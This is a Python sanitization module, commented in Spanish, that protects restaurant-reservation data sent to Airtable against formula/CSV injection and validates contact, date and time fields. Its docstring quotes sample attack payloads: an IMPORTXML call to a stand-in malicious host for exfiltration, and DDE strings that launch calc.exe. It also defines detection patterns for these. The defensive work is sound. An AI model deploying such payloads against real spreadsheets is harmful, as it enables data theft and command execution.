"""
Utilidades de sanitización para prevenir ataques de Formula Injection en Airtable.

Los campos de texto en Airtable pueden interpretarse como fórmulas si comienzan con:
=, +, -, @, |, \\ o caracteres de control.

Esto permite ataques como:
- =IMPORTXML("http://malicious.com/", "//a")  (exfiltración de datos)
- =CMD|'/c calc.exe'!A1                       (ejecución de comandos via DDE)
- |calc.exe!A0                                (DDE en Excel)
- @SUM(1+1)*cmd|'/c calc.exe'!A0             (combinación @)

Referencias:
- https://owasp.org/www-community/attacks/CSV_Injection
- https://airtable.com/developer/web/api/field-types
- https://www.contextis.com/en/blog/comma-separated-vulnerabilities

IMPORTANTE: Esta sanitización es CRÍTICA para la seguridad.
Todos los datos de usuario DEBEN pasar por estas funciones antes de
ser enviados a Airtable.
"""
import re
import logging
from typing import Union, Any

logger = logging.getLogger(__name__)

# Caracteres peligrosos que inician fórmulas en spreadsheets
# Incluye todos los caracteres que pueden iniciar ataques de formula injection
DANGEROUS_PREFIXES = (
    '=',      # Fórmulas estándar
    '+',      # Fórmulas con suma
    '-',      # Fórmulas con resta
    '@',      # At-mentions y fórmulas legacy
    '|',      # DDE (Dynamic Data Exchange) en Excel
    '\\',     # Escape sequences
    '\t',     # Tab (puede concatenar con fórmulas)
    '\r',     # Carriage return
    '\n',     # Newline
    '\x00',   # Null byte
)

# Caracteres que deben escaparse en cualquier posición
DANGEROUS_CHARS = {
    '|': '｜',   # Pipe → Fullwidth pipe (previene DDE)
    '\\': '＼',  # Backslash → Fullwidth backslash
}

# Patrones de fórmulas maliciosas comunes (case-insensitive)
MALICIOUS_PATTERNS = [
    r'^=',                    # Cualquier cosa que empiece con = (fórmula)
    r'^\+',                   # Cualquier cosa que empiece con + (fórmula)
    r'^-',                    # Cualquier cosa que empiece con - (fórmula)
    r'^@',                    # At-mentions
    r'^\|',                   # DDE directo
    r'^\\',                   # Backslash al inicio
    r'.*\|.*!',               # DDE en cualquier posición
]

# Patrón de teléfono E.164 válido (+ seguido de 10-15 dígitos)
E164_PATTERN = re.compile(r'^\+\d{10,15}$')

# Longitudes máximas por tipo de campo
MAX_LENGTHS = {
    'text': 10000,        # Texto general
    'name': 200,          # Nombres
    'phone': 20,          # Teléfonos
    'email': 254,         # Email (RFC 5321)
    'notes': 5000,        # Notas
}


def sanitize_for_airtable(
    value: Union[str, Any],
    field_type: str = 'text',
    max_length: int = None
) -> str:
    """
    Sanitiza un valor para prevenir formula injection en Airtable.
    
    Esta función implementa múltiples capas de protección:
    1. Limpieza de caracteres de control
    2. Escape de caracteres DDE peligrosos (| y \\)
    3. Prefijo de apóstrofo para valores que inician con caracteres peligrosos
    4. Truncamiento a longitud máxima
    
    Args:
        value: El valor a sanitizar
        field_type: Tipo de campo ('text', 'phone', 'email', 'name', 'notes')
        max_length: Longitud máxima (usa MAX_LENGTHS si no se especifica)
    
    Returns:
        Valor sanitizado seguro para Airtable
    
    Example:
        >>> sanitize_for_airtable("=SUM(1+1)")
        "'=SUM(1+1)"
        >>> sanitize_for_airtable("|calc.exe!A0")
        "'｜calc.exe!A0"
        >>> sanitize_for_airtable("Juan Pérez", "name")
        "Juan Pérez"
    """
    # Convertir a string si no lo es
    if not isinstance(value, str):
        if value is None:
            return ''
        value = str(value)
    
    # Eliminar espacios al inicio y final
    value = value.strip()
    
    if not value:
        return value
    
    # Paso 1: Eliminar caracteres de control peligrosos
    # Mantener solo caracteres imprimibles y algunos espacios en blanco seguros
    value = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', value)
    
    # Paso 2: Detectar y loguear patrones maliciosos
    upper_value = value.upper()
    for pattern in MALICIOUS_PATTERNS:
        if re.match(pattern, upper_value, re.IGNORECASE):
            logger.warning(
                f"🚫 Patrón malicioso detectado y neutralizado: "
                f"{value[:50]}{'...' if len(value) > 50 else ''}"
            )
            break
    
    # Paso 3: Escapar caracteres DDE peligrosos en cualquier posición
    for dangerous, safe in DANGEROUS_CHARS.items():
        if dangerous in value:
            value = value.replace(dangerous, safe)
            logger.debug(f"🔒 Carácter peligroso '{dangerous}' escapado")
    
    # Paso 4: Agregar apóstrofo si comienza con carácter peligroso
    # Esto previene que spreadsheets interpreten el valor como fórmula
    if value and value[0] in DANGEROUS_PREFIXES:
        value = "'" + value
    
    # Paso 5: Truncar a longitud máxima
    effective_max = max_length or MAX_LENGTHS.get(field_type, MAX_LENGTHS['text'])
    if len(value) > effective_max:
        logger.warning(
            f"⚠️ Valor truncado de {len(value)} a {effective_max} caracteres"
        )
        value = value[:effective_max]
    
    return value


def sanitize_phone_number(phone: Union[str, None]) -> str:
    """
    Sanitiza y valida un número de teléfono para Airtable.
    
    Args:
        phone: Número de teléfono en cualquier formato
    
    Returns:
        Número sanitizado en formato seguro
    
    Raises:
        ValueError: Si el formato es inválido
    """
    if phone is None or not phone:
        return ''
    
    # Eliminar espacios y caracteres no numéricos excepto +
    cleaned = re.sub(r'[^+\d]', '', phone)
    
    # Validar formato básico
    if not cleaned.startswith('+'):
        # Si no tiene código de país, asumir España (+34)
        cleaned = '+34' + cleaned.lstrip('0')
    
    # Validar longitud (E.164: + y 10-15 dígitos)
    if not E164_PATTERN.match(cleaned):
        raise ValueError(f"Formato de teléfono inválido: {phone}")
    
    # Sanitizar para prevenir formula injection
    # El + al inicio podría interpretarse como operador matemático
    return sanitize_for_airtable(cleaned, 'phone')


def sanitize_email(email: str) -> str:
    """
    Sanitiza y valida un email para Airtable.
    
    Args:
        email: Dirección de email
    
    Returns:
        Email sanitizado
    
    Raises:
        ValueError: Si el formato es inválido
    """
    if not email:
        return ''
    
    email = email.strip().lower()
    
    # Validar formato básico de email
    email_pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
    if not email_pattern.match(email):
        raise ValueError(f"Formato de email inválido: {email}")
    
    return sanitize_for_airtable(email, 'email')


def sanitize_reservation_data(data: dict) -> dict:
    """
    Sanitiza todos los campos de una reserva antes de enviar a Airtable.
    
    Args:
        data: Diccionario con datos de la reserva
    
    Returns:
        Diccionario con valores sanitizados
    """
    sanitized = {}
    
    field_sanitizers = {
        'nombre': lambda x: sanitize_for_airtable(x, 'name'),
        'telefono': sanitize_phone_number,
        'email': sanitize_email,
        'notas': lambda x: sanitize_for_airtable(x, 'text'),
        'mesa': lambda x: sanitize_for_airtable(x, 'text'),
        'estado': lambda x: x.strip() if x else '',
    }
    
    for key, value in data.items():
        if key in field_sanitizers and value:
            try:
                sanitized[key] = field_sanitizers[key](value)
            except ValueError as e:
                logger.error(f"❌ Error sanitizando campo {key}: {e}")
                raise
        else:
            sanitized[key] = value
    
    return sanitized


def is_potentially_malicious(value: str) -> bool:
    """
    Detecta si un valor potencialmente contiene una fórmula maliciosa.
    
    Args:
        value: Valor a verificar
    
    Returns:
        True si parece malicioso, False en caso contrario
    """
    if not isinstance(value, str):
        return False
    
    value = value.strip().upper()
    
    if not value:
        return False
    
    # Verificar prefijos peligrosos
    if value[0] not in ('=', '+', '-', '@', '|', '\\'):
        return False
    
    for pattern in MALICIOUS_PATTERNS:
        if re.match(pattern, value, re.IGNORECASE):
            return True
    
    return False


def sanitize_name(name: str) -> str:
    """
    Sanitiza un nombre de persona para Airtable.
    
    Reglas:
    - Solo letras, espacios, guiones y apóstrofos
    - Primera letra de cada palabra en mayúscula
    - Longitud máxima: 200 caracteres
    
    Args:
        name: Nombre a sanitizar
    
    Returns:
        Nombre sanitizado
    
    Raises:
        ValueError: Si el nombre está vacío o es inválido
    
    Example:
        >>> sanitize_name("  juan   GARCÍA  ")
        "Juan García"
    """
    if not name:
        raise ValueError("El nombre no puede estar vacío")
    
    # Limpiar espacios extras
    name = " ".join(name.split())
    
    # Remover caracteres no permitidos (mantener letras unicode, espacios, guiones, apóstrofos)
    name = re.sub(r"[^a-zA-ZáéíóúüñÁÉÍÓÚÜÑàèìòùÀÈÌÒÙâêîôûÂÊÎÔÛäëïöüÄËÏÖÜçÇ\s\-']", "", name)
    
    if not name.strip():
        raise ValueError("El nombre no contiene caracteres válidos")
    
    # Capitalizar cada palabra
    name = name.title()
    
    # Sanitizar para Airtable
    return sanitize_for_airtable(name, 'name')


def validate_guest_count(count: Union[int, str]) -> int:
    """
    Valida el número de comensales para una reserva.
    
    Args:
        count: Número de personas (puede ser int o string)
    
    Returns:
        Número validado como entero
    
    Raises:
        ValueError: Si el número es inválido o está fuera de rango
    
    Example:
        >>> validate_guest_count("4")
        4
        >>> validate_guest_count(0)  # Raises ValueError
    """
    try:
        num = int(count)
    except (ValueError, TypeError):
        raise ValueError(f"Número de personas inválido: {count}")
    
    if num < 1:
        raise ValueError("El número de personas debe ser al menos 1")
    
    if num > 20:
        raise ValueError("El número máximo de personas es 20 (grupos mayores requieren confirmación)")
    
    return num


def validate_date_format(date_str: str) -> str:
    """
    Valida y normaliza una fecha para reservas.
    
    Args:
        date_str: Fecha en formato YYYY-MM-DD
    
    Returns:
        Fecha validada en formato ISO
    
    Raises:
        ValueError: Si el formato es inválido
    
    Example:
        >>> validate_date_format("2026-02-14")
        "2026-02-14"
    """
    from datetime import datetime, date
    
    if not date_str:
        raise ValueError("La fecha no puede estar vacía")
    
    # Intentar parsear varios formatos comunes
    formats = [
        "%Y-%m-%d",      # ISO: 2026-02-14
        "%d/%m/%Y",      # España: 14/02/2026
        "%d-%m-%Y",      # Con guiones: 14-02-2026
    ]
    
    parsed_date = None
    for fmt in formats:
        try:
            parsed_date = datetime.strptime(date_str.strip(), fmt).date()
            break
        except ValueError:
            continue
    
    if not parsed_date:
        raise ValueError(f"Formato de fecha inválido: {date_str}. Use YYYY-MM-DD")
    
    # Validar que no sea fecha pasada
    today = date.today()
    if parsed_date < today:
        raise ValueError(f"La fecha {parsed_date} ya ha pasado")
    
    # Validar que no sea demasiado en el futuro (3 meses)
    from datetime import timedelta
    max_future = today + timedelta(days=90)
    if parsed_date > max_future:
        raise ValueError("Las reservas se aceptan hasta con 3 meses de antelación")
    
    return parsed_date.isoformat()


def validate_time_format(time_str: str) -> str:
    """
    Valida y normaliza una hora para reservas.
    
    Args:
        time_str: Hora en formato HH:MM
    
    Returns:
        Hora validada en formato HH:MM
    
    Raises:
        ValueError: Si el formato o rango horario es inválido
    
    Example:
        >>> validate_time_format("21:00")
        "21:00"
        >>> validate_time_format("3:00")  # Raises ValueError (fuera de horario)
    """
    from datetime import datetime
    
    if not time_str:
        raise ValueError("La hora no puede estar vacía")
    
    # Intentar parsear
    formats = ["%H:%M", "%H.%M", "%H:%M:%S"]
    
    parsed_time = None
    for fmt in formats:
        try:
            parsed_time = datetime.strptime(time_str.strip(), fmt).time()
            break
        except ValueError:
            continue
    
    if not parsed_time:
        raise ValueError(f"Formato de hora inválido: {time_str}. Use HH:MM")
    
    # Validar que esté en horario de servicio
    # Comidas: 13:00 - 17:00
    # Cenas: 20:00 - 23:00
    hour = parsed_time.hour
    
    is_lunch = 13 <= hour < 17
    is_dinner = 20 <= hour < 24
    
    if not (is_lunch or is_dinner):
        raise ValueError(
            f"La hora {time_str} está fuera del horario de servicio. "
            "Comidas: 13:00-17:00, Cenas: 20:00-23:00"
        )
    
    return parsed_time.strftime("%H:%M")


def sanitize_notes(notes: str) -> str:
    """
    Sanitiza notas especiales de una reserva.
    
    Args:
        notes: Texto de las notas
    
    Returns:
        Notas sanitizadas
    
    Example:
        >>> sanitize_notes("Necesitamos trona para bebé")
        "Necesitamos trona para bebé"
    """
    if not notes:
        return ""
    
    # Sanitizar para Airtable con límite de notas
    return sanitize_for_airtable(notes, 'notes')


def sanitize_all_fields(data: dict) -> dict:
    """
    Sanitiza todos los campos de un diccionario de datos de reserva.
    
    Esta función aplica sanitización específica a cada tipo de campo
    y valida los datos según las reglas de negocio.
    
    Args:
        data: Diccionario con los datos de la reserva
    
    Returns:
        Diccionario con todos los campos sanitizados
    
    Raises:
        ValueError: Si algún campo requerido es inválido
    
    Example:
        >>> data = {"nombre": "Juan", "telefono": "+34600123456", "personas": 4}
        >>> sanitize_all_fields(data)
        {"nombre": "Juan", "telefono": "'+34600123456", "personas": 4}
    """
    sanitized = {}
    
    # Mapeo de campos a funciones de sanitización
    field_handlers = {
        'nombre': ('name', sanitize_name),
        'name': ('name', sanitize_name),
        'telefono': ('phone', sanitize_phone_number),
        'phone': ('phone', sanitize_phone_number),
        'email': ('email', sanitize_email),
        'notas': ('notes', sanitize_notes),
        'notes': ('notes', sanitize_notes),
        'personas': ('count', validate_guest_count),
        'num_guests': ('count', validate_guest_count),
        'fecha': ('date', validate_date_format),
        'date': ('date', validate_date_format),
        'hora': ('time', validate_time_format),
        'time': ('time', validate_time_format),
    }
    
    for key, value in data.items():
        if value is None:
            sanitized[key] = None
            continue
            
        if key.lower() in field_handlers:
            _, handler = field_handlers[key.lower()]
            try:
                sanitized[key] = handler(value)
            except ValueError as e:
                logger.error(f"❌ Error sanitizando campo '{key}': {e}")
                raise
        else:
            # Campos no conocidos: sanitización genérica
            if isinstance(value, str):
                sanitized[key] = sanitize_for_airtable(value, 'text')
            else:
                sanitized[key] = value
    
    return sanitized
